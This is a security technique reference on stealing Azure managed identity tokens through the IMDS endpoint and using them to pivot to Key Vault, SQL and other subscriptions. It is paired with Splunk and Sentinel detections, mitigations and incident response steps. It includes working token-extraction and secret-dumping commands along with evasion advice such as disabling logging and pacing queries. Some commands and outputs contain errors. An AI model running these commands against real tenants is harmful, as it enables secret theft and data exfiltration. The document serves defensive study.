# [LM-AUTH-016]: Managed Identity Cross-Resource Token Theft & Lateral Movement

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-016 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID (Azure AD) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Azure subscriptions with managed identities enabled |
| **Patched In** | N/A (Design pattern, requires mitigation) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure managed identities (both system-assigned and user-assigned) automatically generate access tokens for Azure services without requiring credential management. An attacker with access to an Azure compute resource (VM, App Service, Container, Function App) can extract the managed identity token from the Azure Instance Metadata Service (IMDS) endpoint. This token can then be used to access OTHER Azure resources (databases, Key Vaults, storage accounts, etc.) that the managed identity has permissions to, effectively pivoting across resource boundaries within the same subscription or across subscriptions if RBAC is misconfigured.

**Attack Surface:** Azure IMDS endpoint (169.254.169.254:80), managed identity credential caching, Azure compute resources with attached identities, cross-resource RBAC assignments.

**Business Impact:** Attacker gains token-based access to multiple Azure resources without needing passwords or keys. Can exfiltrate secrets from Key Vaults, access SQL databases, read sensitive data from storage accounts, and maintain persistence via additional role assignments.

**Technical Context:** Token extraction is trivial (single HTTP request) and typically completes in < 1 second. Detection requires monitoring IMDS access patterns or token usage anomalies. Tokens are valid for 1 hour and can be refreshed indefinitely if attacker maintains compute resource access.

### Operational Risk
- **Execution Risk:** Low (requires initial resource compromise, but token theft is trivial)
- **Stealth:** Medium (IMDS access may be logged but often unreviewed; token usage appears legitimate)
- **Reversibility:** No—data exfiltration is permanent unless backup recovery

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.3.1, 1.3.6 | Service Principal and Managed Identity monitoring |
| **DISA STIG** | IA-2, IA-4 | Authentication and Account Management for Azure resources |
| **CISA SCuBA** | AZ-2, AZ-5 | Azure resource authentication and access controls |
| **NIST 800-53** | AC-2.1, AC-3, AC-6 | Account Management and Least Privilege |
| **GDPR** | Art. 32 | Security of Processing; access controls for sensitive data |
| **DORA** | Art. 9, Art. 19 | Protection measures and incident reporting |
| **NIS2** | Art. 21 | Cyber Risk Management; access control enforcement |
| **ISO 27001** | A.9.1.1, A.9.2.5 | User Access Management; Access Review |
| **ISO 27005** | Section 8.3.3 | Risk assessment for identity compromise |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Access to Azure compute resource (VM, App Service, Container instance, Function App)
- **Required Access:** Network connectivity to Azure IMDS endpoint (169.254.169.254); resource must have managed identity attached

**Supported Platforms:**
- **Azure Compute:** VMs, App Services, Container Instances, Kubernetes (AKS), Logic Apps, Function Apps, Automation Accounts
- **Identity Types:** System-Assigned and User-Assigned Managed Identities
- **Azure Environments:** Public Cloud, GCC, GCC High, DoD (all regions)
- **Other Requirements:** Resource must have RBAC role assignment to target resource

**Tools:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/)
- [curl / wget](https://curl.se/) (for IMDS endpoint access)
- [Microsoft Graph PowerShell](https://learn.microsoft.com/en-us/powershell/microsoftgraph/)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Extract Managed Identity Token from IMDS Endpoint

**Supported Versions:** All Azure subscriptions with managed identities

#### Step 1: Gain Access to Azure Compute Resource
**Objective:** Establish shell/command access to Azure VM, App Service, or Container instance.

**Assumption:** Attacker has already gained initial access (e.g., via compromised VM credentials, container escape, or web app RCE)

**Command (Bash - On Azure VM):**
```bash
# Verify we're running on an Azure resource with managed identity
curl -s -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-05-01" | jq '.identity' 2>/dev/null || echo "No managed identity found"

# Check if az CLI is available
az account show 2>/dev/null || echo "az CLI not available - use IMDS instead"
```

**Expected Output:**
```json
{
  "principalId": "12345678-1234-1234-1234-123456789012",
  "tenantId": "87654321-4321-4321-4321-210987654321",
  "type": "SystemAssigned"
}
```

**What This Means:**
- Compute resource has system-assigned managed identity
- Identity is authenticated to Entra ID tenant
- IMDS endpoint is accessible and responding

**OpSec & Evasion:**
- IMDS queries generate minimal logs (not logged by default in most subscriptions)
- However, Activity Log may record IMDS token requests if advanced diagnostics enabled
- Attacker avoids suspicious timing patterns (don't query IMDS 1000s of times rapidly)

**Troubleshooting:**
- **Error:** "Connection refused" to 169.254.169.254
  - **Cause:** IMDS endpoint not available (resource not in Azure or identity not attached)
  - **Fix:** Verify resource is Azure-hosted and has managed identity enabled

#### Step 2: Extract Managed Identity Token from IMDS
**Objective:** Retrieve OAuth token for managed identity without needing credentials.

**Command (Bash - Extract System-Assigned Token):**
```bash
# Request token for Azure Resource Manager (ARM) API
IMDS_TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com" | jq -r '.access_token')

echo "Token obtained: ${IMDS_TOKEN:0:50}..."

# Decode token to verify claims
echo "$IMDS_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq '.' || echo "Cannot decode (expected base64 format)"
```

**Expected Output:**
```
Token obtained: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6I...

{
  "aud": "https://management.azure.com",
  "exp": 1704873600,
  "iat": 1704870000,
  "iss": "https://sts.windows.net/87654321-4321-4321-4321-210987654321/",
  "oid": "12345678-1234-1234-1234-123456789012",
  "roles": ["Contributor", "Reader"],
  "sub": "12345678-1234-1234-1234-123456789012"
}
```

**What This Means:**
- Token is valid OAuth 2.0 JWT with ARM API scope
- Token grants access to all Azure resources this identity has RBAC permissions for
- Roles in token indicate "Contributor" (can read/write) or "Reader" (read-only)
- Token is valid for ~1 hour (exp - iat = 3600 seconds)

**OpSec & Evasion:**
- IMDS token requests are not logged to activity logs by default
- However, token USAGE (API calls) is logged in Azure Activity Log
- Attacker can use token immediately within same compute resource to avoid IP-based detection
- Alternatively, exfiltrate token to attacker-controlled machine (offline use)

**Troubleshooting:**
- **Error:** "AADSTS500016: The user or app ... failed to sign in"
  - **Cause:** Managed identity is disabled or misconfigured
  - **Fix:** Check that resource's identity is enabled: `az resource show --resource-group RG --name VMNAME --resource-type Microsoft.Compute/virtualMachines | grep -i identity`

#### Step 3: Use Token to Access Target Azure Resource
**Objective:** Leverage stolen token to access sensitive resources (databases, Key Vaults, storage).

**Command (Bash - Query Azure SQL Database):**
```bash
# Token from Step 2
IMDS_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6I..."

# Request SQL database connection token (different scope)
SQL_TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://database.windows.net" | jq -r '.access_token')

# Connect to SQL database using token
sqlcmd -S "yoursqlserver.database.windows.net" -d "YourDatabase" -G -U "user@domain.onmicrosoft.com" -P "$SQL_TOKEN"

# Example query: Extract sensitive data
sqlcmd -S "yoursqlserver.database.windows.net" -d "YourDatabase" -G -U "user@domain.onmicrosoft.com" -P "$SQL_TOKEN" -Q "SELECT * FROM CreditCards LIMIT 1000;"
```

**Expected Output:**
```
1> SELECT * FROM Customers LIMIT 10;
2> GO
customer_id    customer_name    email
1              John Doe         john.doe@company.com
2              Jane Smith       jane.smith@company.com
...
```

**What This Means:**
- Attacker can query database without password (token-based auth)
- All data accessible to managed identity role is now compromised
- No MFA required (tokens are post-MFA)

**OpSec & Evasion:**
- SQL queries are logged in Azure SQL audit logs (querylogging enabled)
- However, queries attributed to managed identity appear legitimate
- Bulk data extraction may trigger alert rules in advanced threat protection
- Attacker performs queries slowly (stagger over hours) to avoid DLP triggers

**Troubleshooting:**
- **Error:** "Managed identity lacks permissions to SQL database"
  - **Cause:** Identity does not have SQL Reader role on target database
  - **Fix:** Check RBAC: `az sql server ad-admin list --server yoursqlserver --resource-group RG`

#### Step 4: Access Key Vault to Extract Secrets
**Objective:** Use managed identity token to steal secrets from Azure Key Vault.

**Command (Bash - Extract Key Vault Secret):**
```bash
# Get token for Key Vault scope
KV_TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net" | jq -r '.access_token')

# List all secrets in Key Vault
curl -s -H "Authorization: Bearer $KV_TOKEN" \
  "https://yourvault.vault.azure.net/secrets?api-version=2016-10-01" | jq '.value[].id'

# Extract specific secret value
curl -s -H "Authorization: Bearer $KV_TOKEN" \
  "https://yourvault.vault.azure.net/secrets/DatabasePassword?api-version=2016-10-01" | jq '.value'
```

**Expected Output:**
```
https://yourvault.vault.azure.net/secrets/DatabasePassword
https://yourvault.vault.azure.net/secrets/ApiKey
https://yourvault.vault.azure.net/secrets/TenantSecret

"MySecretPassword123!@#"
```

**What This Means:**
- Attacker can enumerate all secrets in Key Vault
- Secret VALUES are revealed (not encrypted in the response)
- Secrets can be used to access additional services (API keys, connection strings, etc.)

**OpSec & Evasion:**
- Key Vault access is logged in Azure Activity Log
- Log entry: Operation = "List secrets", "Get secret"
- Attacker can disable Key Vault diagnostics logging (if has permissions) or ignore logs
- Key Vault diagnostic logs may be stored in Storage account—attacker targets storage next

**Troubleshooting:**
- **Error:** "The user, group or app ... does not have secrets list permission on key vault yourvault"
  - **Cause:** Managed identity RBAC role lacks Key Vault read permissions
  - **Fix:** Check access policy: `az keyvault show --name yourvault --resource-group RG`

#### Step 5: Lateral Move to Additional Resources
**Objective:** Chain compromised resources to access broader Azure environment.

**Command (PowerShell - Enumerate Resources Accessible via Token):**
```powershell
# Use token to authenticate to Azure
$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6I..."

# Install module if needed
Install-Module -Name Az.Accounts -Force

# Connect using token (no password needed)
Connect-AzAccount -AccessToken $token -ManagedServiceIdentity

# List all resources in subscription
Get-AzResource | Select ResourceName, ResourceType, ResourceGroupName

# List SQL servers
Get-AzSqlServer | Select ServerName, ResourceGroupName

# List Key Vaults
Get-AzKeyVault | Select VaultName, ResourceGroupName

# List storage accounts
Get-AzStorageAccount | Select StorageAccountName, ResourceGroupName
```

**Expected Output:**
```
ResourceName                ResourceType                        ResourceGroupName
---                         ---                                 ----
myvm                        Microsoft.Compute/virtualMachines   RG-Prod
mydbserver                  Microsoft.Sql/servers               RG-Data
myvault                     Microsoft.KeyVault/vaults           RG-Security
mystorageaccount            Microsoft.Storage/storageAccounts   RG-Storage
```

**What This Means:**
- Attacker can now enumerate all Azure resources in subscription
- Can target additional resources based on permissions
- Storage accounts, databases, and vaults are all potential targets

---

### METHOD 2: User-Assigned Managed Identity Takeover

**Supported Versions:** All Azure subscriptions with user-assigned managed identities

#### Step 1: Identify User-Assigned Managed Identity
**Objective:** Discover user-assigned identities that are attached to current resource.

**Command (Bash - Enumerate Managed Identities):**
```bash
# Query IMDS for current resource's attached identities
curl -s -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-05-01" | jq '.identity' 2>/dev/null

# For user-assigned identities, IMDS returns clientId
UAMI_CLIENT_ID=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-05-01" | jq -r '.identity.userAssignedIdentities | keys[0]' 2>/dev/null)

echo "User-Assigned Identity ClientID: $UAMI_CLIENT_ID"

# Request token for this specific identity
UAMI_TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&client_id=$UAMI_CLIENT_ID&resource=https://management.azure.com" | jq -r '.access_token')

echo "User-Assigned Identity Token obtained: ${UAMI_TOKEN:0:50}..."
```

**Expected Output:**
```
User-Assigned Identity ClientID: 87654321-1234-5678-1234-abcdef123456
User-Assigned Identity Token obtained: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6I...
```

**What This Means:**
- Current resource can request tokens for user-assigned identities
- User-assigned identity may have broader permissions than system-assigned
- Attacker can now pivot using broader identity

**OpSec & Evasion:**
- IMDS enumeration is legitimate operation (apps must discover their identities)
- No specific log entry for this query

**Troubleshooting:**
- **Error:** No userAssignedIdentities returned
  - **Cause:** Resource only has system-assigned identity
  - **Fix:** Check if user-assigned identity is attached: `az vm identity show --resource-group RG --name VMNAME`

#### Step 2: Extract UAMI Token and Access Resources
**Objective:** Use user-assigned identity token to access target resources.

**Command (Bash - Exploit User-Assigned Identity):**
```bash
# Request token for Key Vault using user-assigned identity
UAMI_CLIENT_ID="87654321-1234-5678-1234-abcdef123456"
KV_TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&client_id=$UAMI_CLIENT_ID&resource=https://vault.azure.net" | jq -r '.access_token')

# Extract secrets from Key Vault
curl -s -H "Authorization: Bearer $KV_TOKEN" \
  "https://yourvault.vault.azure.net/secrets?api-version=2016-10-01" | jq '.value'

# Extract specific API key
curl -s -H "Authorization: Bearer $KV_TOKEN" \
  "https://yourvault.vault.azure.net/secrets/ApiKey?api-version=2016-10-01" | jq '.value'
```

**Expected Output:**
```
[
  {"id": "https://yourvault.vault.azure.net/secrets/ConnectionString", ...},
  {"id": "https://yourvault.vault.azure.net/secrets/ApiKey", ...}
]

"sk-abc123def456..."  # OpenAI API key exposed
```

**What This Means:**
- User-assigned identity provides access to sensitive secrets
- API keys can be used to access external services (OpenAI, third-party APIs)
- Attacker can escalate to cloud service compromise

---

### METHOD 3: Cross-Subscription Managed Identity Access (If RBAC Misconfigured)

**Supported Versions:** Azure subscriptions with cross-subscription RBAC

#### Step 1: Attempt Cross-Subscription Resource Access
**Objective:** Access resources in different subscription if RBAC allows.

**Command (PowerShell - Exploit Cross-Subscription Access):**
```powershell
# Token from managed identity
$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6I..."

# Connect with token
Connect-AzAccount -AccessToken $token -ManagedServiceIdentity

# List all subscriptions accessible to this identity
Get-AzSubscription | Select SubscriptionName, SubscriptionId, TenantId

# Switch to different subscription
Select-AzSubscription -SubscriptionId "other-subscription-guid"

# Access resources in different subscription
Get-AzResource -ResourceGroupName "OtherTeamRG" | Select ResourceName
```

**Expected Output:**
```
SubscriptionName    SubscriptionId                       TenantId
--------            ---------                             ----
Prod-Subscription   12345678-1234-1234-1234-123456789012 87654321-4321-...
Dev-Subscription    87654321-1234-1234-1234-123456789012 87654321-4321-...

ResourceName                ResourceType
----------                  ---
other-teams-database        Microsoft.Sql/servers
other-teams-storage         Microsoft.Storage/storageAccounts
```

**What This Means:**
- Misconfigured RBAC allowed this identity to access other subscription
- Attacker can now target additional teams' resources
- Cross-subscription access indicates Azure governance failure

---

## 4. ATTACK SIMULATION & VERIFICATION

**Atomic Red Team Test:**
- **Test ID:** [T1550.001 - Use Alternate Authentication Material](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.001/T1550.001.md)
- **Test Name:** Extract and reuse managed identity token
- **Supported Versions:** All Azure subscriptions

**Simulation Command (Non-Destructive):**
```bash
# Simulate IMDS token extraction without accessing sensitive resources
IMDS_TEST=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-05-01" -w "\nHTTP_Status:%{http_code}" 2>&1)

if echo "$IMDS_TEST" | grep -q "HTTP_Status:200"; then
  echo "✓ IMDS endpoint accessible (token extraction possible)"
  echo "✓ Managed identity configured on this resource"
else
  echo "✗ IMDS endpoint not accessible (resource not in Azure or identity not attached)"
fi

# Cleanup (no artifacts created)
echo "Simulation complete"
```

**Cleanup Command:**
```bash
# No persistent changes
echo "No cleanup required"
```

**Reference:** [MITRE T1550](https://attack.mitre.org/techniques/T1550/)

---

## 5. TOOLS & COMMANDS REFERENCE

#### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)
**Version:** 2.40.0+
**Minimum Version:** 2.30.0
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```bash
# Linux/macOS
curl -sL https://aka.ms/InstallAzureCLIDeb | bash

# Windows (via Chocolatey)
choco install azure-cli -y
```

**Usage (Token Request):**
```bash
az account get-access-token --resource https://management.azure.com
```

#### [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/)
**Version:** 10.0.0+
**Minimum Version:** 9.0.0

**Installation:**
```powershell
Install-Module -Name Az -AllowClobber -Scope CurrentUser
```

**Usage (Managed Identity Login):**
```powershell
Connect-AzAccount -Identity
```

#### [curl / wget](https://curl.se/)
**Version:** 7.64+

**Usage (IMDS Token Extraction):**
```bash
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com"
```

---

## 6. SPLUNK DETECTION RULES

#### Rule 1: Suspicious IMDS Token Requests
**Rule Configuration:**
- **Required Index:** `azure_monitor`, `o365:audit`
- **Required Sourcetype:** `azure:compute`, `azure:activity`
- **Required Fields:** `operation_name`, `source_ip`, `request_method`, `endpoint`
- **Alert Threshold:** > 10 IMDS requests from single VM in 5 minutes
- **Applies To Versions:** All Azure subscriptions

**SPL Query:**
```spl
index=azure_monitor source="169.254.169.254" 
  (request_path="*/metadata/identity/oauth2/token*" OR 
   request_path="*/metadata/instance*")
| stats count by src_ip, host, request_path
| where count > 10
| alert
```

**What This Detects:**
- Repeated IMDS token requests (normal apps request once, attackers request many)
- Multiple resource access in rapid sequence
- Abnormal IMDS usage patterns

**Manual Configuration Steps:**
1. Navigate to **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to `count > 10`
6. Configure **Action** → **Email SOC + Disable VM**
7. Set **Frequency** to run every 5 minutes

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Suspicious Managed Identity Token Usage
**Rule Configuration:**
- **Required Table:** `AzureActivity`, `AzureDiagnostics`
- **Required Fields:** `Caller`, `CallerIpAddress`, `OperationName`, `Resource`
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All Azure

**KQL Query:**
```kusto
AzureActivity
| where OperationName in ("List secret", "Get secret", "List secrets", "Get object value")
| where Caller contains "managed identity" or Caller =~ "managed identity"
| summarize SecretAccessCount = dcount(Resource) by Caller, CallerIpAddress, TimeGenerated
| where SecretAccessCount > 3
| project Caller, CallerIpAddress, SecretAccessCount, TimeGenerated
```

**What This Detects:**
- Managed identity accessing multiple secrets in short timeframe
- Unusual access patterns for automated identity
- Cross-resource lateral movement indicators

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Suspicious Managed Identity Token Abuse`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run every: `5 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Alert grouping: Group by `Caller`
6. Click **Review + create**

**Source:** [Microsoft Sentinel Detection Queries](https://github.com/Azure/Azure-Sentinel)

---

## 8. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Suspicious Managed Identity Activity
**Alert Name:** "Suspicious use of managed identity token"
- **Severity:** High
- **Description:** Managed identity requested multiple tokens for different resources in rapid sequence, indicating possible lateral movement
- **Applies To:** All subscriptions with Defender for Cloud enabled
- **Remediation:** Review identity permissions and restrict scope

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Cloud Apps**: ON
4. Click **Save**
5. Go to **Alerts** → Filter by: **Resource Type** = "Managed Identity" AND **Severity** = "High"

---

## 9. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Managed Identity Token Requests
```powershell
Search-UnifiedAuditLog -Operations "Get secret", "List secret", "Get object value" -StartDate (Get-Date).AddDays(-7) | 
  Where-Object {$_.AuditData -like "*managed*identity*"} | 
  Select Timestamp, UserIds, ClientIP, AuditData | 
  Export-Csv "C:\ManagedIdentityAccess.csv"
```

- **Operation:** Get secret, List secret, Get object value
- **Workload:** Azure Resource Manager, Azure Key Vault
- **Details:** Examine `Caller`, `CallerIPAddress`, and `Resource` in AuditData
- **Applies To:** Azure subscriptions with diagnostics enabled

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Subscriptions** → Select subscription
2. Go to **Diagnostic settings**
3. Click **+ Add diagnostic setting**
4. Name: `Enable Activity Log`
5. **Destination:** Send to Log Analytics workspace
6. **Categories:** Check all (ensure "Administrative" is selected)
7. Click **Save**

---

## 10. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

- **Disable Managed Identity if Not Required:** Remove managed identity from resources that don't need cloud API access.
  **Applies To Versions:** All Azure subscriptions
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Virtual Machines** (or other resource type)
  2. Select resource → **Identity**
  3. **System assigned:** Toggle **Status** → **Off** → **Save**
  4. **User assigned:** Remove any identities that are not required
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Disable system-assigned identity
  Update-AzVM -ResourceGroupName "RG" -Name "VMNAME" -IdentityType None
  ```

- **Restrict IMDS Access:** Configure Network Security Groups to block IMDS endpoint access from untrusted processes.
  **Applies To Versions:** Azure VMs with NSGs
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Network Security Groups**
  2. Select NSG → **Inbound security rules**
  3. Click **+ Add**
  4. Configure:
     - Source: **Service Tag - AzureCloud**
     - Destination: Custom **169.254.169.254**
     - Protocol: TCP
     - Port: 80
     - Action: **Deny**
  5. Click **Add**
  
  **Note:** This blocks IMDS for compromised processes but may break legitimate applications using managed identities

- **Implement Managed Identity Access Control:** Use Conditional Access policies to restrict managed identity token issuance.
  **Applies To Versions:** All Azure with Azure AD conditional access
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Restrict Managed Identity Access`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Azure Resource Manager**
     - Conditions: **Client app** = **Managed Identity**
  5. **Access controls:**
     - Grant: **Block access** (if identity is high-risk)
  6. Enable policy: **On**
  7. Click **Create**

- **Enforce Just-In-Time (JIT) Access for Key Vault:** Require approval for Key Vault secret access.
  **Applies To Versions:** Azure Key Vault with RBAC
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Create Key Vault access policy with no secret GET permission by default
  $identityId = "12345678-1234-1234-1234-123456789012"  # Managed identity ObjectID
  
  # Remove all Key Vault permissions
  Remove-AzKeyVaultAccessPolicy -VaultName "yourvault" -ObjectId $identityId
  
  # Add only List permission (cannot get actual values)
  Set-AzKeyVaultAccessPolicy -VaultName "yourvault" -ObjectId $identityId `
    -PermissionsToSecrets List
  ```

#### Priority 2: HIGH

- **Implement Role-Based Access Control (RBAC) Least Privilege:** Assign managed identities to custom RBAC roles with minimal permissions.
  **Applies To Versions:** All Azure subscriptions
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Create custom role with minimal permissions
  $role = @{
    Name = "ManagedIdentity-StorageReadOnly"
    Description = "Read-only access to storage accounts only"
    Type = "CustomRole"
    Actions = @(
      "Microsoft.Storage/storageAccounts/read",
      "Microsoft.Storage/storageAccounts/listKeys/action"
    )
    AssignableScopes = @("/subscriptions/your-subscription-id")
  }
  
  New-AzRoleDefinition -InputObject $role
  
  # Assign role to managed identity
  $identityId = "12345678-1234-1234-1234-123456789012"
  New-AzRoleAssignment -ObjectId $identityId -RoleDefinitionName "ManagedIdentity-StorageReadOnly" `
    -Scope "/subscriptions/your-subscription-id/resourceGroups/RG"
  ```

- **Monitor and Restrict IMDS Token Requests:** Log and alert on IMDS access patterns.
  **Applies To Versions:** All Azure VMs (requires Azure Monitor)
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Virtual Machines** → Select VM
  2. Click **Settings** → **Extensions** → **+ Add**
  3. Select **Azure Monitor Agent**
  4. Click **Create**
  5. Configure to log HTTP requests to 169.254.169.254
  6. Forward logs to Log Analytics workspace
  7. Create alert rule in Sentinel (see Section 7)

- **Use Azure Key Vault RBAC Instead of Access Policies:** Provide finer-grained access control.
  **Applies To Versions:** Azure Key Vault with RBAC enabled (GA)
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Update Key Vault to use RBAC
  Update-AzKeyVault -VaultName "yourvault" -EnableRbacAuthorization
  
  # Assign role binding
  $identityId = "12345678-1234-1234-1234-123456789012"
  New-AzRoleAssignment -ObjectId $identityId `
    -RoleDefinitionName "Key Vault Secrets User" `
    -Scope "/subscriptions/your-subscription-id/resourceGroups/RG/providers/Microsoft.KeyVault/vaults/yourvault"
  ```

#### Access Control & Policy Hardening

- **Implement Condition-Based Access Control:** Restrict token usage based on device compliance, IP location, or time.
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Managed Identity - Device Compliance Required`
  4. **Assignments:**
     - Users: All service principals with managed identity
     - Cloud apps: Azure Resource Manager
  5. **Conditions:**
     - Device state: **Require device to be marked as compliant**
  6. Enable policy: **On**
  7. Click **Create**

#### Validation Command (Verify Fix)
```powershell
# Check if managed identities are disabled on VMs
Get-AzVM -ResourceGroupName "RG" | Select Name, IdentityType
# Expected: IdentityType should be $null or "None"

# Verify RBAC assignments use custom roles (not Reader/Contributor)
Get-AzRoleAssignment -Filter "PrincipalType eq 'ServicePrincipal'" | 
  Select DisplayName, RoleDefinitionName, Scope
# Expected: Should see custom role names (e.g., "ManagedIdentity-StorageReadOnly")

# Check Key Vault RBAC is enabled
Get-AzKeyVault -VaultName "yourvault" | Select EnableRbacAuthorization
# Expected: True
```

**Expected Output (If Secure):**
```
Name    IdentityType
----    ---
vm1     (null/None)
vm2     (null/None)

DisplayName                    RoleDefinitionName                    Scope
-----------                    --------                              -----
managed-identity-app1          ManagedIdentity-StorageReadOnly       /subscriptions/.../resourceGroups/RG
managed-identity-app2          ManagedIdentity-KeyVaultReadSecrets   /subscriptions/.../keyVaults/yourvault

EnableRbacAuthorization : True
```

**What to Look For:**
- Managed identities are **disabled** unless explicitly needed
- RBAC assignments use **custom/minimal roles** (not Reader/Contributor)
- Key Vault uses **RBAC** instead of access policies
- IMDS token requests are **logged and monitored**

---

## 11. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)
- **Activities:** Multiple IMDS token requests in short timeframe (> 10 requests in 5 minutes)
- **Access Patterns:** Managed identity accessing multiple Key Vault secrets sequentially
- **Token Usage:** Tokens used from unusual IP addresses or outside normal service pattern

#### Forensic Artifacts
- **Cloud Logs:** Azure Activity Log (Operation: "Get secret", "List secrets")
- **IMDS Logs:** Application logs from Azure Monitor Agent showing 169.254.169.254 access
- **Key Vault Logs:** Diagnostic logs showing "Get/List" operations by managed identity
- **Compute Logs:** Process execution logs showing curl/wget access to IMDS endpoint

#### Response Procedures

1. **Isolate (Immediate):**
   **Command:**
   ```powershell
   # Disable the compromised resource's managed identity
   Update-AzVM -ResourceGroupName "RG" -Name "VMNAME" -IdentityType None
   
   # Or delete the resource if compromise is severe
   Remove-AzVM -ResourceGroupName "RG" -Name "VMNAME" -Force
   ```
   **Manual (Azure Portal):**
   - Go to **Azure Portal** → **Virtual Machines** → Select VM
   - Click **Delete**

2. **Revoke Tokens (Immediate):**
   ```powershell
   # Rotate Key Vault secrets that the identity accessed
   $secretName = "DatabasePassword"
   $newSecret = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes([System.Guid]::NewGuid().ToString()))
   Set-AzKeyVaultSecret -VaultName "yourvault" -Name $secretName -SecretValue $newSecret
   ```

3. **Collect Evidence (Within 24 hours):**
   ```powershell
   # Export Azure Activity Log for forensic analysis
   Get-AzLog -ResourceGroup "RG" -StartTime (Get-Date).AddDays(-7) -WarningAction SilentlyContinue | 
     Export-Csv "C:\Evidence\AzureActivityLog.csv"
   
   # Export Key Vault access logs
   Get-AzDiagnosticSetting -ResourceId "/subscriptions/.../resourceGroups/RG/providers/Microsoft.KeyVault/vaults/yourvault" | 
     Export-Csv "C:\Evidence\KeyVaultDiagnostics.csv"
   ```

4. **Remediate:**
   ```powershell
   # Disable compromised identity's role assignments
   Get-AzRoleAssignment -ObjectId "12345678-1234-1234-1234-123456789012" | 
     Remove-AzRoleAssignment
   
   # Create new managed identity with least-privilege permissions
   $newIdentity = New-AzUserAssignedIdentity -ResourceGroupName "RG" -Name "NewIdentity"
   ```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-004] Kubelet API Unauthorized Access | Attacker gains access to AKS container or VM |
| **2** | **Lateral Movement** | **[LM-AUTH-016]** | **Extract Managed Identity Token from IMDS** |
| **3** | **Credential Access** | [CA-UNSC-007] Azure Key Vault Secret Extraction | Attacker uses token to steal Key Vault secrets |
| **4** | **Lateral Movement** | [LM-AUTH-005] Service Principal Key/Certificate Abuse | Attacker uses stolen secrets to access other services |
| **5** | **Impact** | [Impact] Data Exfiltration, Persistence | Attacker maintains access and steals sensitive data |

---

## 13. REAL-WORLD EXAMPLES

#### Example 1: AKS Container Escape to Managed Identity Token Theft (2024)
- **Target:** Kubernetes cluster (AKS) in financial services
- **Timeline:** April 2024 - June 2024
